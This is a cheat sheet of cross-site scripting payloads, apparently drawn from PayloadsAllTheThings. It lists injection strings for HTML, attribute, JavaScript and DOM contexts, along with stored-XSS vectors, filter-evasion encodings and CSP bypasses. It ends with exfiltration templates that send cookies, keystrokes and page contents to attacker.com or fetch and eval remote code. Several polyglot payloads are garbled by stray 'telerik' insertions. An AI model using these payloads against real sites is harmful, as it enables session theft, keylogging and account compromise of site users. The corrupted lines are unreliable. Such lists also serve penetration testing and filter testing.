# XSS Payloads

> Source: PayloadsAllTheThings — XSS Injection

## Basic Payloads

```html
<script>alert('XSS')</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
<body onload=alert(1)>
```

## HTML Context Injection

```html
"><script>alert('XSS')</script>
"><img src=x onerror=alert(1)>
<><img src=1 onerror=alert(1)>
</title><script>alert(1)</script>
</textarea><script>alert(1)</script>
</style><script>alert(1)</script>
```

## Attribute Context

```html
" onfocus=alert(1) autofocus="
" onmouseover=alert(1) "
' onfocus=alert(1) autofocus='
<img src=x onerror=alert('XSS')>
<img src=x onerror=alert('XSS')//
<img src=x:alert(alt) onerror=eval(src) alt=xss>
<input type="hidden" accesskey="X" onclick="alert(1)">
<input onfocus=alert(1) autofocus>
```

### href/src Attribute Injection

```html
<a href="javascript:alert(1)">click</a>
<a href="data:text/html,<script>alert(1)</script>">click</a>
<iframe src="javascript:alert(1)">
```

## JavaScript Context

```javascript
'-alert(1)-'
';alert(1)//
\';alert(1)//
-(confirm)(document.domain)//
</script><script>alert(1)</script>
```

## DOM XSS — Common Sinks

### innerHTML

```javascript
#"><img src=/ onerror=alert(2)>
<svg/onload=alert(1)>
```

### eval / setTimeout / setInterval

```javascript
';alert(1)//
\u0061lert(1)
```

### document.write

```javascript
"></script><script>alert(1)</script>
```

### location / location.href / location.replace

```javascript
javascript:alert(document.domain)
data:text/html,<script>alert(1)</script>
```

## Stored XSS Vectors

### SVG Upload

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
<svg><script>alert(1)</script></svg>
```

### Markdown Injection

```markdown
[clickme](javascript:alert(1))
![img](x onerror=alert(1))
```

## Filter Bypass Techniques

### Encoding Bypasses

```
// Hex encoding
\x3cscript\x3ealert(1)\x3c/script\x3e

// Unicode encoding
\u003cscript\u003ealert(1)\u003c/script\u003e

// URL encoding in href
<a href="j&#x61;vascript:alert(1)">click</a>

// HTML entity encoding
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">

// Newline insertion
java%0ascript:alert(1)
java%09script:alert(1)
java%0dscript:alert(1)
```

### Tag Alternatives

```html
<svg/onload=alert('XSS')>
<details/open/ontoggle="alert(1)">
<video/poster/onerror=alert(1)>
<marquee onstart=alert(1)>
<div onpointerover="alert(1)">hover</div>
<body ontouchstart=alert(1)>
<input type="hidden" oncontentvisibilityautostatechange="alert(1)" style="content-visibility:auto">
```

### Event Handler Alternatives

```
onload, onerror, onfocus, onblur, onmouseover, onclick
ontoggle, onstart, onpointerover, ontouchstart
onanimationend, onwebkittransitionend
oncontentvisibilityautostatechange
```

### Case and Concatenation

```html
<ScRiPt>alert(1)</ScRiPt>
<scr<script>ipt>alert(1)</scr</script>ipt>
<script>eval(atob('YWxlcnQoMSk='))</script>
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
```

## CSP Bypass

```html
<!-- base-uri not set -->
<base href="https://attacker.com/">

<!-- script-src with unsafe-eval -->
<script>eval('al'+'ert(1)')</script>

-- data: URI allowed -->
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>

<!-- JSONP endpoint on whitelisted domain -->
<script src="https://whitelisted.com/jsonp?callback=alert(1)//"></script>

<!-- Trusted Types bypass via default policy -->
<!-- Angular: template injection if ng-app present -->
{{constructor.constructor('alert(1)')()}}
```

## Polyglot Payloads

```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%%telerik:telerikfield0telerik:0/telerik;base64,d29telerikybQ==
```

```html
-->'"/></sCript><deTailS open x]oNToggle=(co\u006telerikfirm)``>
```

```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

## Data Exfiltration Templates

```javascript
// Cookie theft
<script>fetch('https://attacker.com/?c='+document.cookie)</script>

// Keylogger
<script>document.onkeypress=function(e){fetch('https://attacker.com/?k='+e.key)}</script>

// Full page content
<script>fetch('https://attacker.com/',{method:'POST',body:document.body.innerHTML})</script>

// Credential harvesting via fake login
<svg/onload="fetch('https://attacker.com/collect').then(r=>r.text().then(t=>eval(t)))">
```
